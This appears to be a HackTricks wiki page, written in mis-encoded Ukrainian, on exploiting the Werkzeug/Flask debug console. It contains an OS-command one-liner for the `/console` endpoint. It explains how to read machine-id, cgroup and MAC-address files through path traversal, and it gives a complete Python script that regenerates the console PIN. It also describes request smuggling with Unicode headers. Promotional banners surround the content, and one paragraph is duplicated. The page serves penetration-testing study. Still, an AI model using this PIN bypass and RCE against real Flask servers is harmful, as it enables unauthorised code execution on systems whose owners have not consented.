# Werkzeug / Flask Debug

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**–ú–∏—Ç—Ç—î–≤–æ –¥–æ—Å—Ç—É–ø–Ω–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –¥–ª—è –æ—Ü—ñ–Ω–∫–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞ –ø–µ–Ω—Ç–µ—Å—Ç–∏–Ω–≥—É**. –ó–∞–ø—É—Å—Ç—ñ—Ç—å –ø–æ–≤–Ω–∏–π –ø–µ–Ω—Ç–µ—Å—Ç –∑ –±—É–¥—å-—è–∫–æ–≥–æ –º—ñ—Å—Ü—è –∑ 20+ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏, —è–∫—ñ –æ—Ö–æ–ø–ª—é—é—Ç—å –≤—ñ–¥ —Ä–æ–∑–≤—ñ–¥–∫–∏ –¥–æ –∑–≤—ñ—Ç—É–≤–∞–Ω–Ω—è. –ú–∏ –Ω–µ –∑–∞–º—ñ–Ω—é—î–º–æ –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä—ñ–≤ - –º–∏ —Ä–æ–∑—Ä–æ–±–ª—è—î–º–æ —Å–ø–µ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –º–æ–¥—É–ª—ñ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ —ó–º —Ç—Ä–æ—Ö–∏ —á–∞—Å—É –¥–ª—è –≥–ª–∏–±—à–æ–≥–æ –∞–Ω–∞–ª—ñ–∑—É, –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É —Ç–∞ —Ä–æ–∑–≤–∞–≥.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

–Ø–∫—â–æ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –∞–∫—Ç–∏–≤–Ω–µ, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ `/console` —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

–í —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ —Ç–∞–∫–æ–∂ —î –∫—ñ–ª—å–∫–∞ –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ [—Ü–µ–π](https://github.com/its-arun/Werkzeug-Debug-RCE) –∞–±–æ –æ–¥–∏–Ω —É metasploit.

## –ó–∞—Ö–∏—â–µ–Ω–∏–π PIN - –ü–µ—Ä–µ—Ö—ñ–¥ –ø–æ —à–ª—è—Ö—É

–í –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö **`/console`** –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ –±—É–¥–µ –∑–∞—Ö–∏—â–µ–Ω–∞ PIN-–∫–æ–¥–æ–º. –Ø–∫—â–æ —É –≤–∞—Å —î **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ –ø–µ—Ä–µ—Ö–æ–¥—É –ø–æ —Ñ–∞–π–ª–∞—Ö**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –≤—Å—é –Ω–µ–æ–±—Ö—ñ–¥–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ü—å–æ–≥–æ PIN-–∫–æ–¥—É.

### –ï–∫—Å–ø–ª–æ–π—Ç PIN-–∫–æ–¥—É –∫–æ–Ω—Å–æ–ª—ñ Werkzeug

–ü—Ä–∏–º—É—Å—å—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø–æ–º–∏–ª–∫–∏ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –≤ –¥–æ–¥–∞—Ç–∫—É, —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ —Ü–µ:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —â–æ–¥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é "–∫–æ–Ω—Å–æ–ª—å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∞" –∑'—è–≤–ª—è—î—Ç—å—Å—è –ø—Ä–∏ —Å–ø—Ä–æ–±—ñ –¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è Werkzeug, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –≤–≤–µ–¥–µ–Ω–Ω—è PIN-–∫–æ–¥—É –¥–ª—è —Ä–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è –∫–æ–Ω—Å–æ–ª—ñ. –ü—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ PIN-–∫–æ–¥ –∫–æ–Ω—Å–æ–ª—ñ, –∞–Ω–∞–ª—ñ–∑—É—é—á–∏ –∞–ª–≥–æ—Ä–∏—Ç–º –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó PIN-–∫–æ–¥—É —É —Ñ–∞–π–ª—ñ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è Werkzeug (`__init__.py`). –ú–µ—Ö–∞–Ω—ñ–∑–º –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó PIN-–∫–æ–¥—É –º–æ–∂–Ω–∞ –≤–∏–≤—á–∏—Ç–∏ –∑ [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), —Ö–æ—á–∞ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π –∫–æ–¥ —Å–µ—Ä–≤–µ—Ä–∞ —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –æ–±—Ö–æ–¥—É —Ñ–∞–π–ª—ñ–≤ —á–µ—Ä–µ–∑ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ —Ä–æ–∑–±—ñ–∂–Ω–æ—Å—Ç—ñ –≤–µ—Ä—Å—ñ–π.

–î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó PIN-–∫–æ–¥—É –∫–æ–Ω—Å–æ–ª—ñ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–≤–∞ –Ω–∞–±–æ—Ä–∏ –∑–º—ñ–Ω–Ω–∏—Ö: `probably_public_bits` —Ç–∞ `private_bits`:

#### **`probably_public_bits`**

* **`username`**: –í—ñ–¥–Ω–æ—Å–∏—Ç—å—Å—è –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π —ñ–Ω—ñ—Ü—ñ—é–≤–∞–≤ —Å–µ—Å—ñ—é Flask.
* **`modname`**: –ó–∞–∑–≤–∏—á–∞–π –ø–æ–∑–Ω–∞—á–∞—î—Ç—å—Å—è —è–∫ `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: –ó–∞–∑–≤–∏—á–∞–π —Ä–æ–∑–≤'—è–∑—É—î—Ç—å—Å—è –≤ **Flask**.
* **`getattr(mod, '__file__', None)`**: –ü—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î –ø–æ–≤–Ω–∏–π —à–ª—è—Ö –¥–æ `app.py` —É –∫–∞—Ç–∞–ª–æ–∑—ñ Flask (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). –Ø–∫—â–æ `app.py` –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è, **—Å–ø—Ä–æ–±—É–π—Ç–µ `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: –û—Ç—Ä–∏–º—É—î MAC-–∞–¥—Ä–µ—Å—É –ø–æ—Ç–æ—á–Ω–æ—ó –º–∞—à–∏–Ω–∏, –∑ `str(uuid.getnode())` –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—á–∏ —ó—ó –≤ –¥–µ—Å—è—Ç–∫–æ–≤–∏–π —Ñ–æ—Ä–º–∞—Ç.
* –©–æ–± **–≤–∏–∑–Ω–∞—á–∏—Ç–∏ MAC-–∞–¥—Ä–µ—Å—É —Å–µ—Ä–≤–µ—Ä–∞**, –ø–æ—Ç—Ä—ñ–±–Ω–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –∞–∫—Ç–∏–≤–Ω–∏–π –º–µ—Ä–µ–∂–µ–≤–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–æ–¥–∞—Ç–∫–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `ens3`). –£ –≤–∏–ø–∞–¥–∫–∞—Ö –Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω–æ—Å—Ç—ñ, **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `/proc/net/arp`** –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è ID –ø—Ä–∏—Å—Ç—Ä–æ—é, –ø–æ—Ç—ñ–º **–≤–∏—Ç—è–≥–Ω—ñ—Ç—å MAC-–∞–¥—Ä–µ—Å—É** –∑ **`/sys/class/net/<device id>/address`**.
* –ü–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ—ó MAC-–∞–¥—Ä–µ—Å–∏ –≤ –¥–µ—Å—è—Ç–∫–æ–≤—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ:

```python
# –ü—Ä–∏–∫–ª–∞–¥ MAC-–∞–¥—Ä–µ—Å–∏: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: –û–±'—î–¥–Ω—É—î –¥–∞–Ω—ñ –∑ `/etc/machine-id` –∞–±–æ `/proc/sys/kernel/random/boot_id` –∑ –ø–µ—Ä—à–∏–º —Ä—è–¥–∫–æ–º `/proc/self/cgroup` –ø—ñ—Å–ª—è –æ—Å—Ç–∞–Ω–Ω—å–æ–≥–æ —Å–ª–µ—à—É (`/`).

<details>

<summary>–ö–æ–¥ –¥–ª—è `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

–ü—ñ—Å–ª—è –∑–±–æ—Ä—É –≤—Å—ñ—Ö –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö, –µ–∫—Å–ø–ªoit-—Å–∫—Ä–∏–ø—Ç –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–∏–π –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó PIN-–∫–æ–¥—É –∫–æ–Ω—Å–æ–ª—ñ Werkzeug:

–ü—ñ—Å–ª—è –∑–±–æ—Ä—É –≤—Å—ñ—Ö –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö, –µ–∫—Å–ø–ªoit-—Å–∫—Ä–∏–ø—Ç –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–∏–π –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó PIN-–∫–æ–¥—É –∫–æ–Ω—Å–æ–ª—ñ Werkzeug. –°–∫—Ä–∏–ø—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∑—ñ–±—Ä–∞–Ω—ñ `probably_public_bits` —Ç–∞ `private_bits` –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ö–µ—à—É, —è–∫–∏–π –ø–æ—Ç—ñ–º –ø—ñ–¥–ª—è–≥–∞—î –ø–æ–¥–∞–ª—å—à—ñ–π –æ–±—Ä–æ–±—Ü—ñ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ PIN-–∫–æ–¥—É. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –∫–æ–¥ Python –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
–¶–µ–π —Å–∫—Ä–∏–ø—Ç –≥–µ–Ω–µ—Ä—É—î PIN, —Ö–µ—à—É—é—á–∏ –∫–æ–Ω–∫–∞—Ç–µ–Ω–æ–≤–∞–Ω—ñ –±—ñ—Ç–∏, –¥–æ–¥–∞—é—á–∏ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ —Å–æ–ª—ñ (`cookiesalt` —Ç–∞ `pinsalt`), —ñ —Ñ–æ—Ä–º–∞—Ç—É—é—á–∏ –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ. –í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Ñ–∞–∫—Ç–∏—á–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è `probably_public_bits` —Ç–∞ `private_bits` –ø–æ—Ç—Ä—ñ–±–Ω–æ —Ç–æ—á–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑ —Ü—ñ–ª—å–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏, —â–æ–± –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ–≥–æ PIN –∑ –æ—á—ñ–∫—É–≤–∞–Ω–∏–º —É –∫–æ–Ω—Å–æ–ª—ñ Werkzeug.

{% hint style="success" %}
–Ø–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ **—Å—Ç–∞—Ä—É –≤–µ—Ä—Å—ñ—é** Werkzeug, —Å–ø—Ä–æ–±—É–π—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ **–∞–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à—É–≤–∞–Ω–Ω—è –Ω–∞ md5** –∑–∞–º—ñ—Å—Ç—å sha1.
{% endhint %}

## –°–∏–º–≤–æ–ª–∏ Unicode Werkzeug

–Ø–∫ –±—É–ª–æ –ø–æ–º—ñ—á–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –ø–∏—Ç–∞–Ω–Ω—ñ**](https://github.com/pallets/werkzeug/issues/2833), Werkzeug –Ω–µ –∑–∞–∫—Ä–∏–≤–∞—î –∑–∞–ø–∏—Ç –∑ —Å–∏–º–≤–æ–ª–∞–º–∏ Unicode –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∞—Ö. –Ü, —è–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://mizu.re/post/twisty-python), —Ü–µ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å CL.0 Request Smuggling.

–¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ –≤ Werkzeug –º–æ–∂–ª–∏–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –¥–µ—è–∫—ñ **—Å–∏–º–≤–æ–ª–∏ Unicode**, —ñ —Ü–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ **–∑–ª–∞–º—É** —Å–µ—Ä–≤–µ—Ä–∞. –û–¥–Ω–∞–∫, —è–∫—â–æ HTTP-–∑'—î–¥–Ω–∞–Ω–Ω—è –±—É–ª–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º **`Connection: keep-alive`**, —Ç—ñ–ª–æ –∑–∞–ø–∏—Ç—É –Ω–µ –±—É–¥–µ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ, —ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑–∞–ª–∏—à–∏—Ç—å—Å—è –≤—ñ–¥–∫—Ä–∏—Ç–∏–º, —Ç–æ–º—É **—Ç—ñ–ª–æ** –∑–∞–ø–∏—Ç—É –±—É–¥–µ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏—Å—è —è–∫ **–Ω–∞—Å—Ç—É–ø–Ω–∏–π HTTP –∑–∞–ø–∏—Ç**.

## –ê–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**–ú–∏—Ç—Ç—î–≤–æ –¥–æ—Å—Ç—É–ø–Ω–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –¥–ª—è –æ—Ü—ñ–Ω–∫–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è**. –ü—Ä–æ–≤–µ–¥—ñ—Ç—å –ø–æ–≤–Ω–∏–π —Ç–µ—Å—Ç –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è –∑ –±—É–¥—å-—è–∫–æ–≥–æ –º—ñ—Å—Ü—è –∑ 20+ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏, —è–∫—ñ –æ—Ö–æ–ø–ª—é—é—Ç—å –≤—ñ–¥ —Ä–æ–∑–≤—ñ–¥–∫–∏ –¥–æ –∑–≤—ñ—Ç—É–≤–∞–Ω–Ω—è. –ú–∏ –Ω–µ –∑–∞–º—ñ–Ω—é—î–º–æ —Ç–µ—Å—Ç—É–≤–∞–ª—å–Ω–∏–∫—ñ–≤ –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è - –º–∏ —Ä–æ–∑—Ä–æ–±–ª—è—î–º–æ —Å–ø–µ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –º–æ–¥—É–ª—ñ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ —ó–º —Ç—Ä–æ—Ö–∏ —á–∞—Å—É –¥–ª—è –≥–ª–∏–±—à–æ–≥–æ –∞–Ω–∞–ª—ñ–∑—É, –∑–ª–∞–º—É –æ–±–æ–ª–æ–Ω–æ–∫ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∑–∞–¥–æ–≤–æ–ª–µ–Ω–Ω—è.

{% embed url="https://pentest-tools.com/" %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
